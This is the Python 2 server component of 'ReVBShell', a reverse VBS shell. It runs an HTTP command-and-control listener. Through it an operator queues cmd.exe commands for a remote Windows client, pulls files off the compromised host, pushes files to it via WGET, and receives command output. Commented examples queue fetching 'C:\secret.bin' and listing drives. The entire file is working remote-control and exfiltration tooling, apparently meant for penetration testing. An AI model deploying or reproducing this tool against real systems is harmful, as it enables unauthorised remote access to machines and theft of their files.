#!/usr/bin/python
#
# This software is provided under under the BSD 3-Clause License.
# See the accompanying LICENSE file for more information.
#
# Server for Reverse VBS Shell
#
# Author:
#  Arris Huijgen
#
# Website:
#  https://github.com/bitsadmin/ReVBShell
#

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import cgi
import os
import sys
from Queue import Queue
from threading import Thread
from shutil import copyfile, rmtree
import ntpath

PORT_NUMBER = 8080


class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # File download
        if self.path.startswith('/f/'):
            # Compile path
            filename = ntpath.basename(self.path)
            filepath = './upload/%s' % filename

            # 404 if no valid file
            if not os.path.exists(filepath):
                self.send_error(404)
                return

            # Return file
            with open(filepath, 'rb') as f:
                self.send_response(200)
                self.send_header('content-type', 'application/octet-stream')
                self.end_headers()
                self.wfile.write(f.read())

            # Remove file from disk
            os.remove(filepath)

            return

        if commands.empty():
            content = 'NOOP'
        else:
            content = commands.get()

        # Return result
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(content)
        return

    # Result from executing command
    def do_POST(self):
        global context

        contenttype_header = self.headers.getheader('content-type')
        if contenttype_header:
            ctype, pdict = cgi.parse_header(contenttype_header)
        else:
            ctype = None

        # File upload
        # if ctype == 'multipart/form-data':
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
        cmd_data = form['cmd'].file.read()
        result_filename = form['result'].filename
        result_data = form['result'].file.read()

        # Show '> ' command input string after command output
        if context:
            cmd_data = cmd_data.replace(context + ' ', '')
        print cmd_data

        # Store file
        if self.path == '/upload':
            # Create folder if required
            if not os.path.exists('download'):
                os.mkdir('download')

            # Write file to disk
            with file(os.path.join('download', result_filename), 'wb') as f:
                f.write(result_data)

            print 'File \'%s\' downloaded.' % result_filename
        # Print output
        else:
            print result_data

        sys.stdout.write('%s> ' % context)

        # Respond
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('OK')
        return

    # Do not write log messages to console
    def log_message(self, format, *args):
        return


def run_httpserver():
    #commands.put('GET C:\\secret.bin')
    #commands.put('SHELL dir C:\\')
    #commands.put('SHELL type client.vbs')
    global server
    server = HTTPServer(('', PORT_NUMBER), myHandler)
    server.serve_forever()

commands = Queue()
server = None
context = ''
variables = {}

def main():
    # Start HTTP server thread
    #run_httpserver() # Run without treads for debugging purposes
    httpserver = Thread(target=run_httpserver)
    httpserver.start()

    # Loop to add new commands
    global context, variables
    s = ''
    while True:
        s = raw_input('%s> ' % context)
        s = s.strip()

        # In a context
        if context == 'SHELL':
            cmd = context

            if s.upper() == 'EXIT':
                context = ''
                continue
            else:
                args = s

                # Ignore empty commands
                if not args:
                    continue
        # No context
        else:
            splitcmd = s.split(' ', 1)
            cmd = splitcmd[0].upper()
            args = ''

            # Ignore empty commands
            if not cmd:
                continue

            # Two options for input commands
            # 1) Full command is entered, i.e.: SHELL dir C:\
            if len(splitcmd) > 1:
                args = splitcmd[1]

                # PUT
                if cmd == 'PUT':
                    args = args.strip("\"")

                    # Check file existence
                    if not os.path.exists(args):
                        print 'File not found: %s' % args
                        continue

                    # Check if LHOST variable is set
                    if 'LHOST' not in variables:
                        print 'Variable LHOST not set'
                        continue

                    lhost = variables['LHOST']

                    # Create folder if required
                    if not os.path.exists('upload'):
                        os.mkdir('upload')

                    # Copy file
                    filename = ntpath.basename(args)
                    copyfile(args, './upload/%s' % filename)

                    # Update command and args
                    cmd = 'WGET'
                    args = 'http://%s:%d/f/%s' % (lhost, PORT_NUMBER, filename)

                # SET
                elif cmd == 'SET':
                    (variable, value) = args.split(' ')
                    variables[variable.upper()] = value
                    continue

                # UNSET
                elif cmd == 'UNSET':
                    if args.upper() in variables:
                        del variables[args.upper()]
                    continue

            # 2) Only context change, i.e.: SHELL
            elif cmd == 'SHELL':
                context = 'SHELL'
                continue
            elif cmd == 'SET':
                print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
                continue
            elif cmd == 'KILL' or cmd == 'SLEEP':
                dummy = 'x'
            elif cmd == 'SHUTDOWN':
                server.shutdown()
                if os.path.exists('./upload'):
                    rmtree('./upload')
                print 'Shutting down %s' % os.path.basename(__file__)
                exit(0)
            elif cmd == 'HELP':
                print 'Supported commands:\n' \
                      '- SLEEP [ms]         - Set client polling interval;\n' \
                      '                       When entered without ms, shows the current interval.\n' \
                      '- SHELL [command]    - Execute command in cmd.exe interpreter;\n' \
                      '                       When entered without command, switches to SHELL context.\n' \
                      '- GET [path]         - Download the file at [path] to the .\\downloads folder.\n' \
                      '- PUT [localpath]    - Upload the file at [path] to the remote host.\n' \
                      '                       Note: Variable LHOST is required.\n' \
                      '- WGET [url]         - Download file from url.\n' \
                      '- KILL               - Stop script on the remote host.\n' \
                      '- SET [name] [value] - Set a variable, for example SET LHOST 192.168.1.77.\n' \
                      '                       When entered without parameters, it shows the currently set variables.\n' \
                      '- UNSET [name]       - Unset a variable\n' \
                      '- SHUTDOWN           - Exit this commandline interface (does not shutdown the client).\n' \
                      '- HELP               - Show this help.\n'
                continue
            else:
                print '%s> Unknown command: %s' % (context, s)
                continue

        commands.put(' '.join([cmd, args]))

if __name__ == '__main__':
    main()